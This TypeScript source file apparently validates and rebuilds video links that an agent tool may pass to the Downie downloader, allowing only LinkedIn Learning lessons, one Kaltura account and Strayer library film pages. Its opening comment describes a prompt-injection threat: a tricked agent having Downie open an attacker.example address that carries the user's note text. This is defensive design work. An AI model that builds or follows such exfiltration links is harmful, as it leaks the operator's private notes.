// Which links Command Center may hand to Downie (2026-11-22, the operator's "Yes, build it").
//
// Why there is a list at all. Downie opens a page with the operator's own sign-ins, and the caller of
// video_pipeline_run is an agent that reads untrusted text. Without a list, a tricked agent could have
// Downie open `https://attacker.example/?notes=...` and send note text out. So the sites are constants
// here, never a setting: data.json sits in the vault, where an agent can write.
//
// Three properties carry the weight:
//   1. A link is REBUILT from its checked parts, never passed on as given, so what Downie's parser reads
//      is plain letters, digits and a few marks. There is nothing for two parsers to disagree about.
//   2. No path or query part may hold `:`, `/` or `%`, so a nested address cannot be written. Redirect
//      pages (LinkedIn's, the library login page's) need one, so none can be used to leave the site.
//   3. Only the page shapes that hold a video pass: one LinkedIn Learning lesson, one Kaltura preview page
//      of the school's own partner account, one film page of a site behind the Strayer library proxy.
//
// Pure: no `obsidian` import, tested by test/video-downie-sites.test.ts.

import { parseSourceUrl } from "./source-url.ts";

export type DownieSite = "linkedin" | "kaltura" | "library";

export interface ApprovedLink {
  /** The address Downie opens, rebuilt from checked parts. */
  url: string;
  host: string;
  site: DownieSite;
  /** The site's name, for messages. */
  siteName: string;
  /**
   * `automatic`: Downie fetches it by itself first, and the guided window opens only if nothing lands.
   * `guided`: the window opens at once, because the automatic way is known to find nothing there.
   */
  firstTry: "automatic" | "guided";
  /** Text that a download of this very page carries in its details file (src/video/downie.ts). */
  pageTokens: readonly string[];
}

export type LinkApproval =
  | { ok: true; link: ApprovedLink }
  /** `other-site`: not a site on the list. `refused`: a listed site, but not one of its video pages. */
  | { ok: false; kind: "other-site" | "refused"; reason: string };

/** Longest link that is ever handed over. The longest of 110 past links was under 200. */
export const APPROVED_LINK_MAX_LENGTH = 512;

const SITE_NAMES: Record<DownieSite, string> = {
  linkedin: "LinkedIn Learning",
  kaltura: "Kaltura",
  library: "the Strayer library",
};

/** The sites, for messages and tool descriptions. */
export const APPROVED_SITE_LIST = "LinkedIn Learning lessons, the school's Kaltura videos and Strayer library films";

const PLAIN_SEGMENT = /^[A-Za-z0-9._~-]+$/;
const SIMPLE_QUERY_NAME = /^[A-Za-z][A-Za-z0-9_]{0,23}$/;
const SIMPLE_QUERY_VALUE = /^[A-Za-z0-9_-]{1,40}$/;

// LinkedIn: exactly /learning/<course>/<lesson>. Everything else on linkedin.com is refused, redirectors
// included. `u` is the school's account number, which sends a signed-out browser to the right sign-in.
const LINKEDIN_HOSTS = new Set(["linkedin.com", "www.linkedin.com"]);
const LINKEDIN_SLUG = /^[A-Za-z0-9-]{1,120}$/;
const LINKEDIN_NOT_A_COURSE = new Set([
  "browse", "certificates", "collections", "instructors", "me", "paths", "roles", "search", "topics",
]); // prettier-ignore
const LINKEDIN_ACCOUNT = /^\d{1,12}$/;

// Kaltura: the preview page of the school's own partner account. Anyone can have a Kaltura account, so
// the partner number is pinned: all 22 past Kaltura runs used this one.
const KALTURA_HOSTS = new Set(["www.kaltura.com", "cdnapisec.kaltura.com"]);
const KALTURA_PARTNER = "956951";
const KALTURA_PREVIEW = new RegExp(
  `^/index\\.php/extwidget/preview/partner_id/${KALTURA_PARTNER}/uiconf_id/(\\d{1,10})/entry_id/([01]_[a-z0-9]{8})/embed/dynamic/?$`
);

// The Strayer library's proxy: one label per vendor site ("video-alexanderstreet-com"). Any vendor's FILM
// page passes: one of the first three path parts must be a film word. The sign-in host forwards to
// whatever address it is given and the DOI host to a publisher's own server, so neither is ever opened.
const LIBRARY_DOMAIN = "libdatab.strayer.edu";
const LIBRARY_HOST = /^([a-z0-9]+(?:-[a-z0-9]+)*)\.libdatab\.strayer\.edu$/;
const LIBRARY_REFUSED_LABELS = new Set(["login", "www", "doi-org", "dx-doi-org"]);
const LIBRARY_LOGIN_HOSTS = new Set([LIBRARY_DOMAIN, `login.${LIBRARY_DOMAIN}`]);
const FILM_WORD = /^(?:watch|videos?|films?|movies?|play|player|p_viewvideo\.aspx)$/i;
const LIBRARY_MAX_SEGMENTS = 8;
const LIBRARY_MAX_QUERY = 4;

function refuse(site: DownieSite, why: string): LinkApproval {
  return { ok: false, kind: "refused", reason: `this ${SITE_NAMES[site]} link cannot be handed to Downie: ${why}` };
}

function approve(site: DownieSite, host: string, pathAndQuery: string, pageTokens: readonly string[]): LinkApproval {
  const url = `https://${host}${pathAndQuery}`;
  if (url.length > APPROVED_LINK_MAX_LENGTH) {
    return refuse(site, `it is longer than ${APPROVED_LINK_MAX_LENGTH} characters`);
  }
  return {
    ok: true,
    link: {
      url,
      host,
      site,
      siteName: SITE_NAMES[site],
      firstTry: site === "library" ? "guided" : "automatic",
      pageTokens,
    },
  };
}

function segmentsOf(parsed: URL): string[] {
  return parsed.pathname.replace(/\/+$/, "").split("/").slice(1);
}

function approveLinkedIn(parsed: URL): LinkApproval {
  const segments = segmentsOf(parsed);
  const [root, course, lesson] = segments;
  if (root !== "learning") return refuse("linkedin", "only a lesson page (/learning/<course>/<lesson>) is");
  if (segments.length === 2 && LINKEDIN_SLUG.test(course)) {
    return refuse("linkedin", "it names a whole course; pass the link of one lesson");
  }
  if (
    segments.length !== 3 ||
    !LINKEDIN_SLUG.test(course) ||
    !LINKEDIN_SLUG.test(lesson) ||
    LINKEDIN_NOT_A_COURSE.has(course.toLowerCase())
  ) {
    return refuse("linkedin", "only a lesson page (/learning/<course>/<lesson>) is");
  }
  // Every other parameter (resume, autoAdvance, tracking) is dropped: none is needed to play the lesson.
  const account = parsed.searchParams.get("u") ?? "";
  const page = `/learning/${course}/${lesson}`;
  return approve("linkedin", "www.linkedin.com", LINKEDIN_ACCOUNT.test(account) ? `${page}?u=${account}` : page, [page]);
}

function approveKaltura(parsed: URL): LinkApproval {
  const match = parsed.pathname.match(KALTURA_PREVIEW);
  if (!match) {
    return refuse("kaltura", "only a preview page of the school's own videos (/extwidget/preview/partner_id/...) is");
  }
  const [, uiconf, entry] = match;
  return approve(
    "kaltura",
    parsed.hostname,
    `/index.php/extwidget/preview/partner_id/${KALTURA_PARTNER}/uiconf_id/${uiconf}/entry_id/${entry}/embed/dynamic`,
    [entry]
  );
}

/** Every query parameter, kept only when all are few and simple; null when any is not. */
function simpleQuery(parsed: URL): string | null {
  const parts: string[] = [];
  for (const [name, value] of parsed.searchParams) {
    if (!SIMPLE_QUERY_NAME.test(name) || !SIMPLE_QUERY_VALUE.test(value)) return null;
    parts.push(`${name}=${value}`);
  }
  if (parts.length > LIBRARY_MAX_QUERY) return null;
  return parts.length > 0 ? `?${parts.join("&")}` : "";
}

function approveLibrary(parsed: URL): LinkApproval {
  const label = parsed.hostname.match(LIBRARY_HOST)?.[1];
  if (!label || LIBRARY_REFUSED_LABELS.has(label)) {
    return refuse("library", "this part of the library only forwards to other pages; pass the film's own page");
  }
  const segments = segmentsOf(parsed);
  // A film's transcript tab is the same film: Downie names the film's own page in what it saves.
  if (segments.length > 2 && segments[segments.length - 1].toLowerCase() === "transcript") segments.pop();
  const filmAt = segments.findIndex((segment) => FILM_WORD.test(segment));
  if (filmAt < 0 || filmAt > 2) {
    return refuse("library", "it is not a film page (no /watch/, /video/ or /film/ near the start of its address)");
  }
  if (segments.length > LIBRARY_MAX_SEGMENTS || !segments.every((segment) => PLAIN_SEGMENT.test(segment))) {
    return refuse("library", "its address holds characters or a depth a film page does not have");
  }
  const query = simpleQuery(parsed);
  if (query === null) return refuse("library", "its ?part is not a short plain one");
  if (segments.length === filmAt + 1 && query === "") {
    return refuse("library", "it names no film");
  }
  const page = `/${segments.join("/")}`;
  return approve("library", parsed.hostname, `${page}${query}`, [page]);
}

/**
 * The library's sign-in form of a link (`login.libdatab.strayer.edu/login?url=https://video...`), which is
 * what a course page usually gives. The page itself is never opened, because it forwards anywhere: its
 * target is turned into the vendor's own proxied address, which the proxy signs the operator in to.
 */
function approveLibraryLogin(parsed: URL): LinkApproval {
  const targets = [...parsed.searchParams].filter(([name]) => name === "url" || name === "qurl").map(([, value]) => value);
  if (parsed.pathname !== "/login" || targets.length !== 1) {
    return refuse("library", "it is not a film page, nor a sign-in link to one");
  }
  const target = parseSourceUrl(targets[0]);
  if ("problem" in target) return refuse("library", "the address inside its sign-in link is not a plain https page");
  const inner = new URL(target.url);
  if (inner.port) return refuse("library", "the address inside its sign-in link names a port");
  if (LIBRARY_HOST.test(inner.hostname)) return approveLibrary(inner);
  // Dots become hyphens. How the proxy writes a hyphen that was already there is not known, so refuse it.
  if (!/^[a-z0-9]+(?:\.[a-z0-9]+)+$/.test(inner.hostname)) {
    return refuse("library", "the site inside its sign-in link has a name this rule does not know how to write");
  }
  return approveLibrary(
    new URL(`https://${inner.hostname.replaceAll(".", "-")}.${LIBRARY_DOMAIN}${inner.pathname}${inner.search}`)
  );
}

/** May Downie open this link, and as what? Never throws. */
export function approveDownieLink(raw: unknown): LinkApproval {
  const checked = parseSourceUrl(typeof raw === "string" ? raw.trim() : "");
  if ("problem" in checked) return { ok: false, kind: "other-site", reason: "it is not a plain https link" };
  const parsed = new URL(checked.url);
  const host = parsed.hostname;
  const site: DownieSite | null = LINKEDIN_HOSTS.has(host)
    ? "linkedin"
    : KALTURA_HOSTS.has(host)
      ? "kaltura"
      : host === LIBRARY_DOMAIN || host.endsWith(`.${LIBRARY_DOMAIN}`)
        ? "library"
        : null;
  if (site === null) return { ok: false, kind: "other-site", reason: "its site is not on the approved list" };
  if (parsed.port) return refuse(site, "it names a port");
  if (site === "linkedin") return approveLinkedIn(parsed);
  if (site === "kaltura") return approveKaltura(parsed);
  return LIBRARY_LOGIN_HOSTS.has(host) ? approveLibraryLogin(parsed) : approveLibrary(parsed);
}
